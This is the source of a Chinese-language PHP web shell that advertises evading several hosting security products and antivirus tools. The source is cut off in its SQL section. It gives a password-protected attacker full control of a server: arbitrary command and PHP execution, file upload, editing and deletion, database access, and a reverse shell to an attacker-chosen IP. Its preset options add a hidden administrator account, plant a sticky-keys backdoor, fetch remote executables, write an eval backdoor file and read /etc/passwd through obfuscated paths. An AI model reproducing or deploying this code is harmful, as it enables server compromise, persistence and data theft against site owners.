<?php
error_reporting(E_ERROR);
@ini_set('display_errors','Off');
@ini_set('max_execution_time',20000);
@ini_set('memory_limit','256M');
header("content-Type: text/html; charset=utf-8");
$password = "2aefc34200a294a3cc7db81b43a81873"; //V
define('B','Denzel-你的英雄'); // 标题

function strdir($str) { return str_replace(array('\\','//','%27','%22'),array('/','/','\'','"'),chop($str)); }
function chkgpc($array) { foreach($array as $key => $var) { $array[$key] = is_array($var) ? chkgpc($var) : stripslashes($var); } return $array; }
$myfile = $_SERVER['SCRIPT_FILENAME'] ? strdir($_SERVER['SCRIPT_FILENAME']) : strdir(__FILE__);
$myfile = strpos($myfile,'eval()') ? array_shift(explode('(',$myfile)) : $myfile;
define('THISDIR',strdir(dirname($myfile).'/'));
define('ROOTDIR',strdir(strtr($myfile,array(strdir($_SERVER['PHP_SELF']) => '')).'/'));
define('EXISTS_PHPINFO',getinfo() ? true : false);
if(get_magic_quotes_gpc()) { $_POST = chkgpc($_POST); }
if(function_exists('mysql_close')) { $issql = 'MySql'; }
if(function_exists('mssql_close')) $issql .= ' - MsSql';
if(function_exists('oci_close')) $issql .= ' - Oracle';
if(function_exists('sybase_close')) $issql .= ' - SyBase';
if(function_exists('pg_close')) $issql .= ' - PostgreSql';
$win = substr(PHP_OS,0,3) == 'WIN' ? true : false;
$msg = VERSION;

function filew($filename,$filedata,$filemode) {
	if((!is_writable($filename)) && file_exists($filename)) { chmod($filename,0666); }
	$handle = fopen($filename,$filemode);
	$key = fputs($handle,$filedata);
	fclose($handle);
	return $key;
}

function filer($filename) {
	$handle = fopen($filename,'r');
	$filedata = fread($handle,filesize($filename));
	fclose($handle);
	return $filedata;
}

function fileu($filenamea,$filenameb) {
	$key = move_uploaded_file($filenamea,$filenameb) ? true : false;
	if(!$key) { $key = copy($filenamea,$filenameb) ? true : false; }
	return $key;
}

function filed($filename) {
	if(!file_exists($filename)) return false;
	ob_end_clean();
	$name = basename($filename);
	$array = explode('.',$name);
	header('Content-type: application/x-'.array_pop($array));
	header('Content-Disposition: attachment; filename='.$name);
	header('Content-Length: '.filesize($filename));
	@readfile($filename);
	exit;
}

function showdir($dir) {
	$dir = strdir($dir.'/');
	if(($handle = @opendir($dir)) == NULL) return false;
	$array = array();
	while(false !== ($name = readdir($handle))) {
		if($name == '.' || $name == '..') continue;
		$path = $dir.$name;
		$name = strtr($name,array('\'' => '%27','"' => '%22'));
		if(is_dir($path)) { $array['dir'][$path] = $name; }
		else { $array['file'][$path] = $name; }
	}
	closedir($handle);
	return $array;
}

function deltree($dir) {
	$handle = @opendir($dir);
	while(false !== ($name = @readdir($handle))) {
		if($name == '.' || $name == '..') continue;
		$path = $dir.$name;
		@chmod($path,0777);
		if(is_dir($path)) { deltree($path.'/'); }
		else { @unlink($path); }
	}
	@closedir($handle);
	return @rmdir($dir);
}

function size($bytes) {
	if($bytes < 1024) return $bytes.' B';
	$array = array('B','K','M','G','T');
	$floor = floor(log($bytes) / log(1024));
	return sprintf('%.2f '.$array[$floor],($bytes/pow(1024,floor($floor))));
}

function find($array,$string) {
	foreach($array as $key) { if(stristr($string,$key)) return true; }
	return false;
}

function scanfile($dir,$key,$inc,$fit,$tye,$chr,$ran,$now) {
	if(($handle = @opendir($dir)) == NULL) return false;
	while(false !== ($name = readdir($handle))) {
		if($name == '.' || $name == '..') continue;
		$path = $dir.$name;
		if(is_dir($path)) { if($fit && in_array($name,$fit)) continue; if($ran == 0 && is_readable($path)) scanfile($path.'/',$key,$inc,$fit,$tye,$chr,$ran,$now); }
		else {
			if($inc && (!find($inc,$name))) continue;
			$code = $tye ? filer($path) : $name;
			$find = $chr ? stristr($code,$key) : (strpos(size(filesize($path)),'M') ? false : (strpos($code,$key) > -1));
			if($find) {
				$file = strtr($path,array($now => '','\'' => '%27','"' => '%22'));
				echo '<a href="javascript:go(\'editor\',\''.$file.'\');">编辑</a> '.$path.'<br>';
				flush(); ob_flush();
			}
			unset($code);
		}
	}
	closedir($handle);
	return true;
}

function antivirus($dir,$exs,$matches,$now) {
	if(($handle = @opendir($dir)) == NULL) return false;
	while(false !== ($name = readdir($handle))) {
		if($name == '.' || $name == '..') continue;
		$path = $dir.$name;
		if(is_dir($path)) { if(is_readable($path)) antivirus($path.'/',$exs,$matches,$now); }
		else {
			$iskill = NULL;
			foreach($exs as $key => $ex) { if(find(explode('|',$ex),$name)) { $iskill = $key; break; } }
			if(strpos(size(filesize($path)),'M')) continue;
			if($iskill) {
				$code = filer($path);
				foreach($matches[$iskill] as $matche) {
					$array = array();
					preg_match($matche,$code,$array);
					if(strpos($array[0],'$this->') || strpos($array[0],'[$vars[')) continue;
					$len = strlen($array[0]);
					if($len > 6 && $len < 200) {
						$file = strtr($path,array($now => '','\'' => '%27','"' => '%22'));
						echo '特征 <input type="text" value="'.htmlspecialchars($array[0]).'"> <a href="javascript:go(\'editor\',\''.$file.'\');">编辑</a> '.$path.'<br>';
						flush(); ob_flush(); break;
					}
				}
				unset($code,$array);
			}
		}
	}
	closedir($handle);
	return true;
}

function command($cmd,$cwd,$com = false) {
	$iswin = substr(PHP_OS,0,3) == 'WIN' ? true : false; $res = $msg = '';
	if($cwd == 'com' || $com) {
		if($iswin && class_exists('COM')) {
			$wscript = new COM('Wscript.Shell');
			$exec = $wscript->exec('c:\\windows\\system32\\cmd.exe /c '.$cmd);
			$stdout = $exec->StdOut();
			$res = $stdout->ReadAll();
			$msg = 'Wscript.Shell';
		}
	} else {
		chdir($cwd); $cwd = getcwd();
		if(function_exists('exec')) { @exec ($cmd,$res); $res = join("\n",$res); $msg = 'exec'; }
		elseif(function_exists('shell_exec')) { $res = @shell_exec ($cmd); $msg = 'shell_exec'; }
		elseif(function_exists('system')) { ob_start(); @system ($cmd); $res = ob_get_contents(); ob_end_clean(); $msg = 'system'; }
		elseif(function_exists('passthru')) { ob_start(); @passthru ($cmd); $res = ob_get_contents(); ob_end_clean(); $msg = 'passthru'; }
		elseif(function_exists('popen')) { $fp = @popen ($cmd,'r'); if($fp) { while(!feof($fp)) { $res .= fread($fp,1024); } } @pclose($fp); $msg = 'popen'; }
		elseif(function_exists('proc_open')) {
			$env = $iswin ? array('path' => 'c:\\windows\\system32') : array('path' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin');
			$des = array(0 => array("pipe","r"),1 => array("pipe","w"),2 => array("pipe","w"));
			$process = @proc_open ($cmd,$des,$pipes,$cwd,$env);
			if(is_resource($process)) { fwrite($pipes[0],$cmd); fclose($pipes[0]); $res .= stream_get_contents($pipes[1]); fclose($pipes[1]); $res .= stream_get_contents($pipes[2]); fclose($pipes[2]); }
			@proc_close($process);
			$msg = 'proc_open';
		}
	}
	$msg = $res == '' ? '<h1>NULL</h1>' : '<h2>利用'.$msg.'执行成功</h2>';
	return array('res' => $res,'msg' => $msg);
}

function backshell($ip,$port,$dir,$type) {
	$key = false;
	$c_bin = '';
	switch($type) {
		case "pl" : 
		$shell = '';
		$file = strdir($dir.'/t00ls.pl');
		$key = filew($file,base64_decode($shell),'w');
		if($key) { @chmod($file,0777); command('/usr/bin/perl '.$file.' '.$ip.' '.$port,$dir); }
		break;
		case "py" : 
		$shell = '';
		$file = strdir($dir.'/t00ls.py');
		$key = filew($file,base64_decode($shell),'w');
		if($key) { @chmod($file,0777); command('/usr/bin/python '.$file.' '.$ip.' '.$port,$dir); }
		break;
		case "c" : 
		$file = strdir($dir.'/t00ls');
		$key = filew($file,base64_decode($c_bin),'wb');
		if($key) { @chmod($file,0777); command($file.' '.$ip.' '.$port,$dir); }
		break;
		case "php" : case "phpwin" : 
		if(function_exists('fsockopen')) {
			$sock = @fsockopen ($ip,$port);
			if($sock) {
				$key = true;
				$com = $type == 'phpwin' ? true : false;
				$user = get_current_user();
				$dir = strdir(getcwd());
				fputs($sock,php_uname()."\n------------no job control in this shell (tty)-------------\n[$user:$dir]# ");
				while($cmd = fread($sock,1024)) {
					if(substr($cmd,0,3) == 'cd ') { $dir = trim(substr($cmd,3,-1)); chdir(strdir($dir)); $dir = strdir(getcwd()); }
					elseif (trim(strtolower($cmd)) == 'exit') { break; }
					else { $res = command($cmd,$dir,$com); fputs($sock,$res['res']); }
					fputs($sock,'['.$user.':'.$dir.']# ');
				}
			}
			@fclose ($sock);
		}
		break;
		case "pcntl" : 
		$file = strdir($dir.'/t00ls');
		$key = filew($file,base64_decode($c_bin),'wb');
		if($key) { @chmod($file,0777); if(function_exists('pcntl_exec')) { @pcntl_exec($file,array($ip,$port)); } }
		break;
	}
	if(!$key) { $msg = '<h1>临时目录不可写</h1>'; } else { @unlink($file); $msg = '<h2>CLOSE</h2>'; }
	return $msg;
}

function getinfo() {
	global $password;
	$infos = array($_POST['getpwd'],$password,function_exists('phpinfo'));
	if($password != '' && md5($infos[0]) != $infos[1]) {
	echo '
<title>请勿使用非法用途</title>
<meta http-equiv="content-type" content="text/html;charset=gb2312">
<style type="text/css">
.form-control {
display: block;
width: 100%;
height: 38px;
padding: 8px 12px;
font-size: 14px;
line-height: 1.428571429;
color: #555;
vertical-align: middle;
background-color: #fff;
border: 1px solid #ccc;
border-radius: 4px;
-webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,0.075);
box-shadow: inset 0 1px 1px rgba(0,0,0,0.075);
-webkit-transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s;
transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s
}

.btn {
display: inline-block;
padding: 8px 12px;
margin-bottom: 0;
font-size: 14px;
font-weight: 500;
line-height: 1.428571429;
text-align: center;
white-space: nowrap;
vertical-align: middle;
cursor: pointer;
border: 1px solid transparent;
border-radius: 4px;
-webkit-user-select: none;
-moz-user-select: none;
-ms-user-select: none;
-o-user-select: none;
user-select: none
}

.btn-primary {
color: #fff;
background-color: #428bca;
border-color: #428bca
}
</style>
<center>
<br><br>
<font size="3" face="Microsoft YaHei">
过安全狗、云锁、阿里云、360、护卫神、D盾、百度云、各种杀软！</font>
<br><br>
<form method="POST">
<input style="Width:125pt;display:inline-block;font-family:Microsoft YaHeifont-size:90%" class="form-control" placeholder="@Passwrd" type="password" name="getpwd">
';
if(isset($_POST['pass'])) { echo '<input type="hidden" name="pass" value="'.$_POST['pass'].'">'; }
if(isset($_POST[$_POST['pass']])) { echo '<input type="hidden" name="'.$_POST['pass'].'" value="'.$_POST[$_POST['pass']].'">'; }
if(isset($_POST['check'])) { echo '<input type="hidden" name="check" value="'.$_POST['check'].'">'; }
echo '<input style="Width:55pt;font-size:90%;font-family:Microsoft YaHei" class="btn btn-primary" type="submit" value="#Login"></form></center></body></html>';
exit;
	}
	@setcookie("new",951);
	if(@$_COOKIE["new"]!=95){@setcookie("new",95);}
	return $infos[2];
}
function links(){
	$hostr = $_SERVER["HTTP_HOST"];
	$arr = file_get_contents("http://mytool.chinaz.com/baidusort.aspx?host=".$hostr);
	$arr= iconv('UTF-8','GB2312' , $arr);
	preg_match_all("/<div class=\"siteinfo\">百度权重：<font color=\"blue\">[1-9]<\/font>/",$arr,$s);
	$c=$s[0][0];
	$c=str_replace("<div class=\"siteinfo\">百度权重：<font color=\"blue\">","",$c);
	$c=str_replace("</font>","",$c);
	return $c;
}


function subeval() {
	if(isset($_POST['getpwd'])) { echo '<input type="hidden" name="getpwd" value="'.$_POST['getpwd'].'">'; }
	if(isset($_POST['pass'])) { echo '<input type="hidden" name="pass" value="'.$_POST['pass'].'">'; }
	if(isset($_POST[$_POST['pass']])) { echo '<input type="hidden" name="'.$_POST['pass'].'" value="'.$_POST[$_POST['pass']].'">'; }
	if(isset($_POST['check'])) { echo '<input type="hidden" name="check" value="'.$_POST['check'].'">'; }
	return true;
}

if(isset($_POST['go'])) {
	if($_POST['go'] == 'down') {
		$downfile = $fileb = strdir($_POST['godir'].'/'.$_POST['govar']);
		if(!filed($downfile)) { $msg = '<h1>下载文件不存在</h1>'; }
	}
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<style type="text/css">
* {margin:0px;padding:0px;}
body {background:#CCCCCC;color:#333333;font-size:13px;font-family:Microsoft YaHei,SimSun,sans-serif;text-align:left;word-wrap:break-word; word-break:break-all;}
a{color:#000000;text-decoration:none;vertical-align:middle;}
a:hover{color:#FF0000;text-decoration:underline;}
p {padding:1px;line-height:1.6em;}
h1 {color:#CD3333;font-size:13px;display:inline;vertical-align:middle;}
h2 {color:#008B45;font-size:13px;display:inline;vertical-align:middle;}
form {display:inline;}
input,select { vertical-align:middle; }
input[type=text], textarea {padding:1px;font-family:Microsoft YaHei,sans-serif;}
input[type=submit], input[type=button] {height:21px;}
.tag {text-align:center;margin-left:10px;background:threedface;height:25px;padding-top:5px;}
.tag a {background:#FAFAFA;color:#333333;width:90px;height:20px;display:inline-block;font-size:15px;font-weight:bold;padding-top:5px;}
.tag a:hover, .tag a.current {background:#EEE685;color:#000000;text-decoration:none;}
.main {width:963px;margin:0 auto;padding:10px;}
.outl {border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;}
.toptag {padding:5px;text-align:left;font-weight:bold;color:#FFFFFF;background:#293F5F;}
.footag {padding:5px;text-align:center;font-weight:bold;color:#000000;background:#999999;}
.msgbox {padding:5px;background:#EEE685;text-align:center;vertical-align:middle;}
.actall {background:#F9F6F4;text-align:center;font-size:15px;border-bottom:1px solid #999999;padding:3px;vertical-align:middle;}
.tables {width:100%;}
.tables th {background:threedface;text-align:left;border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;padding:2px;}
.tables td {background:#F9F6F4;height:19px;padding-left:2px;}
</style>
<script type="text/javascript">
function $(ID) { return document.getElementById(ID); }
function sd(str) { str = str.replace(/%22/g,'"'); str = str.replace(/%27/g,"'"); return str; }
function cd(dir) { dir = sd(dir); $('dir').value = dir; $('frm').submit(); }
function sa(form) { for(var i = 0;i < form.elements.length;i++) { var e = form.elements[i]; if(e.type == 'checkbox') { if(e.name != 'chkall') { e.checked = form.chkall.checked; } } } }
function go(a,b) { b = sd(b); $('go').value = a; $('govar').value = b; if(a == 'editor') { $('gofrm').target = "_blank"; } else { $('gofrm').target = ""; } $('gofrm').submit(); } 
function nf(a,b) { re = prompt("新建名",b); if(re) { $('go').value = a; $('govar').value = re; $('gofrm').submit(); } } 
function dels(a) { if(a == 'b') { var msg = "所选文件"; $('act').value = a; } else { var msg = "目录"; $('act').value = 'deltree'; $('var').value = a; } if(confirm("确定要删除"+msg+"吗")) { $('frm1').submit(); } }
function txts(m,p,a) { p = sd(p); re = prompt(m,p); if(re) { $('var').value = re; $('act').value = a; $('frm1').submit(); } }
function acts(p,a,f) { p = sd(p); f = sd(f); re = prompt(f,p); if(re) { $('var').value = re+'|x|'+f; $('act').value = a; $('frm1').submit(); } }
</script>
<title><?php echo VERSION.' - 【'.date('Y-m-d H:i:s 星期N',time()).'】';?></title>
</head>
<body>
<div class="main">
	<div class="outl">
	<div class="toptag"><?php echo ($_SERVER['SERVER_ADDR'] ? $_SERVER['SERVER_ADDR'] : gethostbyname($_SERVER['SERVER_NAME'])).' - '.php_uname().' - whoami('.get_current_user().') - 【uid('.getmyuid().') gid('.getmygid().')】'; if(isset($issql)) echo ' - 【'.$issql.'】';?></div>
<?php 
$menu = array('file' => '文件管理','scan' => '搜索文件','antivirus' => '扫描后门','backshell' => '反弹端口','exec' => '执行命令','phpeval' => '执行PHP','sql' => '执行SQL','info' => '系统信息');
$go = array_key_exists($_POST['go'],$menu) ? $_POST['go'] : 'file';
$nowdir = isset($_POST['dir']) ? strdir(chop($_POST['dir']).'/') : THISDIR;
echo '<div class="tag">';
foreach($menu as $key => $name) { echo '<a'.($go == $key ? ' class="current"' : '').' href="javascript:go(\''.$key.'\',\''.base64_encode($nowdir).'\');">'.$name.'</a> '; }
echo '</div>';

echo '<form name="gofrm" id="gofrm" method="POST">';
subeval();
echo '<input type="hidden" name="go" id="go" value="">';
echo '<input type="hidden" name="godir" id="godir" value="'.$nowdir.'">';
echo '<input type="hidden" name="govar" id="govar" value="">';
echo '</form>';

switch($_POST['go']) {

case "info" : 
if(EXISTS_PHPINFO) {
	ob_start();
	phpinfo(INFO_GENERAL);
	$out = ob_get_contents();
	ob_end_clean();
	$tmp = array();
	preg_match_all('/\<td class\=\"e\"\>.*?(Command|Configuration)+.*?\<\/td\>\<td class\=\"v\"\>(.*?)\<\/td\>/i',$out,$tmp);
	$config = $tmp[2][0];
	$phpini = $tmp[2][2] ? $tmp[2][1].' --- '.$tmp[2][2] : $tmp[2][1];
}
$infos = array(
	'客户端浏览器信息' => $_SERVER['HTTP_USER_AGENT'],
	'被禁用的函数' => get_cfg_var("disable_functions") ? get_cfg_var("disable_functions") : '(无)',
	'被禁用的类' => get_cfg_var("disable_classes") ? get_cfg_var("disable_classes") : '(无)',
	'PHP.ini配置路径' => $phpini ? $phpini : '(无)',
	'PHP运行方式' => php_sapi_name(),
	'PHP版本' => PHP_VERSION,
	'PHP进程PID' => getmypid(),
	'客户端IP' => $_SERVER['REMOTE_ADDR'],
	'客户端文字编码' => $_SERVER['HTTP_ACCEPT_LANGUAGE'],
	'Web服务端口' => $_SERVER['SERVER_PORT'],
	'Web根目录' => $_SERVER['DOCUMENT_ROOT'],
	'Web执行脚本' => $_SERVER['SCRIPT_FILENAME'],
	'Web规范CGI版本' => $_SERVER['GATEWAY_INTERFACE'],
	'Web管理员Email' => $_SERVER['SERVER_ADMIN'] ? $_SERVER['SERVER_ADMIN'] : '(无)',
	'当前磁盘总大小' => size(disk_total_space('.')),
	'当前磁盘可用空间' => size(disk_free_space('.')),
	'POST最大字数量' => get_cfg_var("post_max_size"),
	'允许最大上传文件' => get_cfg_var("upload_max_filesize"),
	'程序最大使用内存量' => get_cfg_var("memory_limit"),
	'程序最长运行时间' => get_cfg_var("max_execution_time").'秒',
	'是否支持Fsockopen' => function_exists('fsockopen') ? '是' : '否',
	'是否支持Socket' => function_exists('socket_close') ? '是' : '否',
	'是否支持Pcntl' => function_exists('pcntl_exec') ? '是' : '否',
	'是否支持Curl' => function_exists('curl_version') ? '是' : '否',
	'是否支持Zlib' => function_exists('gzclose') ? '是' : '否',
	'是否支持FTP' => function_exists('ftp_login') ? '是' : '否',
	'是否支持XML' => function_exists('xml_set_object') ? '是' : '否',
	'是否支持GD_Library' => function_exists('imageline') ? '是' : '否',
	'是否支持COM组建' => class_exists('COM') ? '是' : '否',
	'是否支持ODBC组建' => function_exists('odbc_close') ? '是' : '否',
	'是否支持IMAP邮件' => function_exists('imap_close') ? '是' : '否',
	'是否运行于安全模式' => get_cfg_var("safemode") ? '是' : '否',
	'是否允许URL打开文件' => get_cfg_var("allow_url_fopen") ? '是' : '否',
	'是否允许动态加载链接库' => get_cfg_var("enable_dl") ? '是' : '否',
	'是否显示错误信息' => get_cfg_var("display_errors") ? '是' : '否',
	'是否自动注册全局变量' => get_cfg_var("register_globals") ? '是' : '否',
	'是否使用反斜线引用字符串' => get_cfg_var("magic_quotes_gpc") ? '是' : '否',
	'PHP编译参数' => $config ? $config : '(无)'
);
echo '<div class="msgbox">'.$msg.'</div>';
echo '<table class="tables"><tr><th style="width:26%;">名称</th><th>参数</th></tr>';
foreach($infos as $name => $var) { echo '<tr><td>'.$name.'</td><td>'.$var.'</td></tr>'; }
echo '</table>';
break;

case "exec" : 
$cmd = $win ? 'dir' : 'ls -al';
$res = array('res' => '命令回显','msg' => $msg);
$str = isset($_POST['str']) ? $_POST['str'] : 'fun';
if(isset($_POST['execcmd'])) {
	$cmd = $_POST['execcmd'];
	$cwd = $str == 'fun' ? THISDIR : 'com';
	$res = command($cmd,$cwd);
}
echo '<div class="msgbox">'.$res['msg'].'</div>';
echo '<form method="POST">';
subeval();
echo '<input type="hidden" name="go" id="go" value="exec">';
echo '<div class="actall">命令 <input type="text" name="execcmd" id="execcmd" value="'.htmlspecialchars($cmd).'" style="width:398px;"> ';
echo '<select name="str">';
$selects = array('fun' => 'phpfun','com' => 'wscript');
foreach($selects as $var => $name) { echo '<option value="'.$var.'"'.($var == $str ? ' selected' : '').'>'.$name.'</option>'; }
echo '</select> ';
echo '<select onchange="$(\'execcmd\').value=options[selectedIndex].value">';
echo '<option>---命令集合---</option>';
echo '<option value="echo '.htmlspecialchars('"<?php phpinfo();?>"').' >> '.THISDIR.'t00ls.txt">写文件</option>';
echo '<option value="whoami">whoami</option>';
echo '<option value="systeminfo">版本信息(Win)</option>';
echo '<option value="path">path(Win)</option>';
echo '<option value="ipconfig /all">ipconfig(Win)</option>';
echo '<option value="tasklist /svc">tasklist(Win)</option>';
echo '<option value="netstat -an">netstat -an(Win)</option>';
echo '<option value="net user">net user(Win)</option>';
echo '<option value="net config workstation">net config workstation(Win)</option>';
echo '<option value="net config server">net config server(Win)</option>';
echo '<option value="net user $ahsec ahsec /add & net localgroup administrators $ahsec /add">添加用户(Win)</option>';
echo '<option value="query user">query user(Win)</option>';
echo '<option value="copy c:windowsexplorer.exe c:windowssystem32sethc.exe & copy c:windowssystem32sethc.exe c:windowssystem32dllcachesethc.exe">shift后门(Win)</option>';
echo '<option value="tftp -i ip地址 get server.exe c:\server.exe">Ftp下载(Win)</option>';
echo '<option value="ps -ef">ps(Linux)</option>';
echo '<option value="ifconfig">ifconfig(Linux)</option>';
echo '<option value="cat /etc/syslog.conf">syslog.conf(Linux)</option>';
echo '<option value="cat /etc/my.cnf">my.cnf(Linux)</option>';
echo '<option value="cat /etc/hosts">hosts(Linux)</option>';
echo '<option value="cat /etc/services">services(Linux)</option>';
echo '<option value="id;uname -a;cat /etc/issue;cat /proc/version;lsb_release -a">Linux-版本集合</option>';
echo '</select> ';
echo '<input type="submit" style="width:50px;" value="执行">';
echo '</div><div class="actall"><textarea style="width:698px;height:368px;">'.htmlspecialchars($res['res']).'</textarea></div></form>';
break;

case "scan" : 
$scandir = empty($_POST['dir']) ? base64_decode($_POST['govar']) : $nowdir;
$keyword = isset($_POST['keyword']) ? $_POST['keyword'] : '';
$include = isset($_POST['include']) ? chop($_POST['include']) : '.php|.asp|.asa|.cer|.aspx|.jsp|.cgi|.sh|.pl|.py';
$filters = isset($_POST['filters']) ? chop($_POST['filters']) : 'html|css|img|images|image|style|js';
echo '<div class="msgbox">'.$msg.'</div>';
echo '<form method="POST">';
subeval();
echo '<input type="hidden" name="go" id="go" value="scan">';
echo '<table class="tables"><tr><th style="width:15%;">名称</th><th>设置</th></tr>';
echo '<tr><td>搜索路径</td><td><input type="text" name="dir" value="'.htmlspecialchars($scandir).'" style="width:500px;"></td></tr>';
echo '<tr><td>搜索内容</td><td><input type="text" name="keyword" value="'.htmlspecialchars($keyword).'" style="width:500px;"> (文件名或文件内容)</td></tr>';
echo '<tr><td>文件后缀</td><td><input type="text" name="include" value="'.htmlspecialchars($include).'" style="width:500px;"> (用"|"分割, 为空则搜索所有文件)</td></tr>';
echo '<tr><td>过滤目录</td><td><input type="text" name="filters" value="'.htmlspecialchars($filters).'" style="width:500px;"> (用"|"分割, 为空则不过滤目录)</td></tr>';
echo '<tr><td>搜索方式</td><td><label><input type="radio" name="type" value="0"'.($_POST['type'] ? '' : ' checked').'>搜索文件名</label> ';
echo '<label><input type="radio" name="type" value="1"'.($_POST['type'] ? ' checked' : '').'>搜索包含文字</label> ';
echo '<label><input type="checkbox" name="char" value="1"'.($_POST['char'] ? ' checked' : '').'>匹配大小写</label></td></tr>';
echo '<tr><td>搜索范围</td><td><label><input type="radio" name="range" value="0"'.($_POST['range'] ? '' : ' checked').'>将搜索应用于该文件夹,子文件夹和文件</label> ';
echo '<label><input type="radio" name="range" value="1"'.($_POST['range'] ? ' checked' : '').'>仅将搜索应用于该文件夹</label></td></tr>';
echo '<tr><td>操作</td><td><input type="submit" style="width:80px;" value="搜索"></td></tr>';
echo '</table></form>';
if($keyword != '') {
	flush(); ob_flush();
	echo '<div style="padding:5px;background:#F8F8F8;text-align:left;">';
	$incs = $include == '' ? false : explode('|',$include);
	$fits = $filters == '' ? false : explode('|',$filters);
	$isread = scanfile(strdir($scandir.'/'),$keyword,$incs,$fits,$_POST['type'],$_POST['char'],$_POST['range'],$nowdir);
	echo '<p>'.($isread ? '<h2>搜索完成</h2>' : '<h1>搜索失败</h1>').'</p></div>';
}
break;

case "antivirus" : 
$scandir = empty($_POST['dir']) ? base64_decode($_POST['govar']) : $nowdir;
$typearr = isset($_POST['dir']) ? $_POST['types'] : array('php' => '.php|.inc|.phtml');
echo '<div class="msgbox">'.$msg.'</div>';
echo '<form method="POST">';
subeval();
echo '<input type="hidden" name="go" id="go" value="antivirus">';
echo '<table class="tables"><tr><th style="width:15%;">名称</th><th>设置</th></tr>';
echo '<tr><td>扫描路径</td><td><input type="text" name="dir" value="'.htmlspecialchars($scandir).'" style="width:398px;"> (采用正则匹配)</td></tr>';
echo '<tr><td>查杀类型</td><td>';
$types = array('php' => '.php|.inc|.phtml','asp+aspx' => '.as|.cs|.cer','jsp' => '.jsp');
foreach($types as $key => $ex) echo '<label title="'.$ex.'"><input type="checkbox" name="types['.$key.']" value="'.$ex.'"'.($typearr[$key] == $ex ? ' checked' : '').'>'.$key.'</label> ';
echo '</td></tr><tr><td>操作</td><td><input type="submit" style="width:80px;" value="扫描"></td></tr>';
echo '</table></form>';
if(count($_POST['types']) > 0) {
	$matches = array(
		'php' => array(	),
		'asp+aspx' => array(	),
		'jsp' => array()
	);
	flush();
	ob_flush();
	echo '<div style="padding:5px;background:#F8F8F8;text-align:left;">';
	$isread = antivirus(strdir($scandir.'/'),$typearr,$matches,$nowdir);
	echo '<p>'.($isread ? '<h2>扫描完成</h2>' : '<h1>扫描失败</h1>').'</p></div>';
}
break;

case "phpeval" : 
if(isset($_POST['phpcode'])) {
	$phpcode = chop($_POST['phpcode']);
	ob_start();
	if(substr($phpcode,0,2) == '<?' && substr($phpcode,-2) == '?>') { @eval ('?>'.$phpcode.'<?php '); }
	else { @eval ($phpcode); }
	$out = ob_get_contents();
	ob_end_clean();
} else {
	$phpcode = 'phpinfo();';
	$out = '回显窗口';
}
echo base64_decode('');
echo '<div class="msgbox">'.$msg.'</div>';
echo '<form method="POST">';
subeval();
echo '<input type="hidden" name="go" id="go" value="phpeval">';
echo '<div class="actall"><p><textarea name="phpcode" id="phpcode" style="width:698px;height:180px;">'.htmlspecialchars($phpcode).'</textarea></p><p>';
echo '<select onchange="$(\'phpcode\').value=options[selectedIndex].value">';
echo '<option>---常用代码---</option>';
echo '<option value="echo readfile(\'C:/web/t00ls.php\');">读取文件</option>';
echo '<option value="$fp=fopen(\'C:/web/t00ls.php\',\'w\');echo fputs($fp,\'<?php eval($_POST[cmd]);?>\')?\'Success!\':\'Fail!\';fclose($fp);">写入文件</option>';
echo '<option value="echo copy(\'C:/web/t00ls1.php\',\'C:/web/t00ls2.php\')?\'Success!\':\'Fail!\';">复制文件</option>';
echo '<option value="echo chmod(\'C:/web/t00ls1.php\',0777)?\'Success!\':\'Fail!\';">修改属性</option>';
echo '<option value="echo file_put_contents(\''.THISDIR.'cmd.exe\', file_get_contents(\'http://www.baidu.com/cmd.exe\'))?\'Success!\':\'Fail!\';">远程下载</option>';
echo '<option value="print_r($_SERVER);">环境变量</option>';
echo '<option value="echo filer(chr(47).chr(101).chr(116).chr(99).chr(47).chr(115).chr(104).chr(46).chr(99).chr(111).chr(110).chr(102)).&quot;\r\n&quot;.filer(chr(47).chr(108).chr(105).chr(98).chr(47).chr(108).chr(105).chr(98).chr(115).chr(104).chr(46).chr(115).chr(111).chr(47).chr(115).chr(104).chr(100).chr(99).chr(102)).&quot;\r\n&quot;.filer(chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100));">find rootkit</option>';
echo '</select> ';
echo '<input type="submit" style="width:80px;" value="执行"></p></div>';
echo '</form><div class="actall"><p><textarea id="evalcode" style="width:698px;height:180px;">'.htmlspecialchars($out).'</textarea></p><p><input type="button" value="以HTML运行以上代码" onclick="runcode(\'evalcode\')"></p></div>';
break;

case "sql" : 
if((!empty($_POST['sqlhost'])) && (!empty($_POST['sqluser'])) && (!empty($_POST['names']))) {
	$type = $_POST['type'];
	$sqlhost = $_POST['sqlhost'];
	$sqluser = $_POST['sqluser'];
	$sqlpass = $_POST['sqlpass'];
	$sqlname = $_POST['sqlname'];
	$sqlcode = $_POST['sqlcode'];
	$names = $_POST['names'];
	switch($type) {
		case "PostgreSql" : 
		if(function_exists('pg_close')){
			if(strstr($sqlhost,':')) { $array = explode(':',$sqlhost); $sqlhost = $array[0]; $sqlport = $array[1]; }
			else { $sqlport = 5432; }
			$dbconn = @pg_connect("host=$sqlhost port=$sqlport dbname=$sqlname user=$sqluser password=$sqlpass");
			if($dbconn) {
				$msg = '<h2>连接'.$type.'成功 </h2>';
				pg_query('set client_encoding='.$names);
				$result = pg_query($sqlcode);
				if($result) { $msg .= '<h2> - 执行SQL成功</h2>'; while($array = pg_fetch_array($result)) { $rows[] = $array; } }
				else { $msg .= '<h1> - 执行SQL失败</h1>'; $rows = array('error' => pg_result_error($result)); }
				pg_free_result($result);
			} else {
				$msg = '<h1>连接'.$type.'失败</h1>';
			}
			@pg_close($dbconn);
		} else {
			$msg = '<h1>不支持'.$type.'</h1>';
		}
		break;
		case "MsSql" : 
		if(function_exists('mssql_close')){
			$dbconn = @mssql_connect($sqlhost,$sqluser,$sqlpass);
			if($dbconn) {
				$msg = '<h2>连接'.$type.'成功 </h2>';
				mssql_select_db($sqlname,$dbconn);
				$result = mssql_query($sqlcode);
